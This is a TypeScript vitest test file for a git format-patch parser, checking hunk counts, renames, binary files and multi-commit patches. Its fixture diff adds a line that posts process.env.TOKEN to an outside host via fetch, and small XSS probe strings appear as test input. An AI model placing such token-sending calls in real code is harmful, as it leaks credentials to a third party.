import { describe, expect, it } from 'vitest';

import { PATCH } from './__fixtures__/contribute-attempts';
import { parsePatch } from './patch';

describe('parsePatch', () => {
  it('reads each file of a two-commit format-patch, without the mail headers or the signature', () => {
    const parsed = parsePatch(PATCH);

    expect(parsed.files.map(({ path, status }) => [path, status])).toEqual([
      ['src/router/layout-cache.ts', 'modified'],
      ['src/router/normalize-path.ts', 'added'],
      ['test/layout-cache.spec.ts', 'modified'],
    ]);
    expect(parsed.added).toBe(8);
    expect(parsed.removed).toBe(2);
    const texts = parsed.files.flatMap(({ lines }) => lines.map(({ text }) => text));
    expect(texts.some((text) => text.startsWith('Subject:') || text === '2.47.0' || text === '-- ')).toBe(false);
  });

  it('reads a hunk by its counts, so a removed line that looks like the signature stays a removed line', () => {
    const [first] = parsePatch(PATCH).files;

    expect(first.lines.map(({ kind }) => kind)).toEqual([
      'hunk',
      'context',
      'del',
      'del',
      'add',
      'add',
      'add',
      'context',
      'context',
    ]);
    expect(first.lines[3].text).toBe('-- a removed line that looks like a signature');
    expect([first.added, first.removed]).toEqual([3, 2]);
  });

  it('keeps the "no newline" note, and the text exactly as written', () => {
    const added = parsePatch(PATCH).files[1];

    expect(added.lines.at(-1)).toEqual({ kind: 'note', text: '\\ No newline at end of file' });
    expect(added.lines[1].text).toBe('+/** <script>alert("x")</script> & friends */');
  });

  it('shows a renamed, a deleted and a binary file', () => {
    const parsed = parsePatch(
      [
        'diff --git a/old.ts b/new.ts',
        'similarity index 90%',
        'rename from old.ts',
        'rename to new.ts',
        'diff --git a/gone.ts b/gone.ts',
        'deleted file mode 100644',
        '--- a/gone.ts',
        '+++ /dev/null',
        '@@ -1 +0,0 @@',
        '-export {}',
        'diff --git a/logo.png b/logo.png',
        'Binary files a/logo.png and b/logo.png differ',
      ].join('\n'),
    );

    expect(parsed.files.map(({ path, from, status, binary }) => ({ path, from, status, binary }))).toEqual([
      { path: 'new.ts', from: 'old.ts', status: 'renamed', binary: false },
      { path: 'gone.ts', from: null, status: 'deleted', binary: false },
      { path: 'logo.png', from: null, status: 'modified', binary: true },
    ]);
    expect(parsed.removed).toBe(1);
  });

  it('is empty for no patch, or text that is not one', () => {
    expect(parsePatch(null).files).toEqual([]);
    expect(parsePatch('<img src=x onerror=alert(1)>').files).toEqual([]);
  });
});

/** One commit of a format-patch: its mail headers, its message, a diff, and the signature. */
const commit = (sha: string, subject: string, message: string, diff: string) =>
  [
    `From ${sha} Mon Sep 17 00:00:00 2001`,
    'From: Octo Cat <octocat@users.noreply.github.com>',
    `Subject: [PATCH] ${subject}`,
    '',
    message,
    '---',
    diff,
    '-- ',
    '2.47.0',
    '',
  ].join('\n');

const A_DIFF = [
  'diff --git a/src/a.ts b/src/a.ts',
  'index 1111111..2222222 100644',
  '--- a/src/a.ts',
  '+++ b/src/a.ts',
  '@@ -1,2 +1,3 @@',
  ' const a = 1',
  "+fetch('https://example.com', { body: process.env.TOKEN })",
  ' export { a }',
].join('\n');

const B_DIFF = [
  'diff --git a/src/b.ts b/src/b.ts',
  '--- a/src/b.ts',
  '+++ b/src/b.ts',
  '@@ -1 +1 @@',
  '-old',
  '+new',
].join('\n');

/** A message that reads like every file-level line a header may hold. */
const TRICKY_MESSAGE = [
  'Binary files are left alone by this change.',
  'rename from z.ts',
  'new file mode 100644',
  'deleted file mode 100644',
  '+++ /dev/null',
  '\\ not a note',
  'GIT binary patch',
].join('\n');

describe('parsePatch and commit messages', () => {
  it("never lets a later commit's message relabel the file before it", () => {
    const parsed = parsePatch(
      commit('1111111', 'Add a request', 'First.', A_DIFF) + commit('2222222', 'Tidy', TRICKY_MESSAGE, B_DIFF),
    );
    const [a, b] = parsed.files;

    expect(a).toMatchObject({ path: 'src/a.ts', from: null, status: 'modified', binary: false, added: 1, removed: 0 });
    expect(a.lines.map(({ text }) => text)).toContain("+fetch('https://example.com', { body: process.env.TOKEN })");
    expect(a.lines.some(({ text }) => text.includes('not a note'))).toBe(false);
    expect(b).toMatchObject({ path: 'src/b.ts', status: 'modified', binary: false });
  });

  it('ends a file at the end of its last hunk, even without the signature or the next mail headers', () => {
    const parsed = parsePatch(`${A_DIFF}\n${TRICKY_MESSAGE}\n${B_DIFF}`);

    expect(parsed.files[0]).toMatchObject({ path: 'src/a.ts', status: 'modified', binary: false, from: null });
    expect(parsed.files[0].lines).toHaveLength(4);
    expect(parsed.files[1].path).toBe('src/b.ts');
  });

  it('reads a second hunk of the same file, and a note right after a hunk', () => {
    const parsed = parsePatch([A_DIFF, '\\ No newline at end of file', '@@ -9 +10 @@', '-x', '+y'].join('\n'));

    expect(parsed.files[0].lines.map(({ kind }) => kind)).toEqual([
      'hunk',
      'context',
      'add',
      'context',
      'note',
      'hunk',
      'del',
      'add',
    ]);
  });

  it('shows a file changed by two commits once, with a line naming the next commit between them', () => {
    const second = A_DIFF.replace('@@ -1,2 +1,3 @@', '@@ -3 +3 @@').replace(
      / const a = 1\n.*\n export \{ a \}/,
      '-x\n+y',
    );
    const parsed = parsePatch(commit('1111111', 'One', 'First.', A_DIFF) + commit('2222222', 'Two', 'Second.', second));

    expect(parsed.files).toHaveLength(1);
    const [a] = parsed.files;
    expect(a.lines.map(({ kind }) => kind)).toEqual([
      'hunk',
      'context',
      'add',
      'context',
      'commit',
      'hunk',
      'del',
      'add',
    ]);
    expect(a.lines[4].text).toBe('Next commit: Two');
    expect([a.added, a.removed]).toEqual([2, 1]);
  });

  it('shows a rename in a later commit as its own renamed file, and keeps a file added earlier as added', () => {
    const added = [
      'diff --git a/src/new.ts b/src/new.ts',
      'new file mode 100644',
      '--- /dev/null',
      '+++ b/src/new.ts',
      '@@ -0,0 +1 @@',
      '+one',
    ].join('\n');
    const changed = [
      'diff --git a/src/new.ts b/src/new.ts',
      '--- a/src/new.ts',
      '+++ b/src/new.ts',
      '@@ -1 +1 @@',
      '-one',
      '+two',
    ].join('\n');
    const renamed = [
      'diff --git a/src/a.ts b/src/c.ts',
      'similarity index 100%',
      'rename from src/a.ts',
      'rename to src/c.ts',
    ].join('\n');
    const parsed = parsePatch(
      commit('1111111', 'One', 'First.', `${A_DIFF}\n${added}`) +
        commit('2222222', 'Two', 'Second.', `${changed}\n${renamed}`),
    );

    expect(parsed.files.map(({ path, from, status }) => [path, from, status])).toEqual([
      ['src/a.ts', null, 'modified'],
      ['src/new.ts', null, 'added'],
      ['src/c.ts', 'src/a.ts', 'renamed'],
    ]);
  });
});
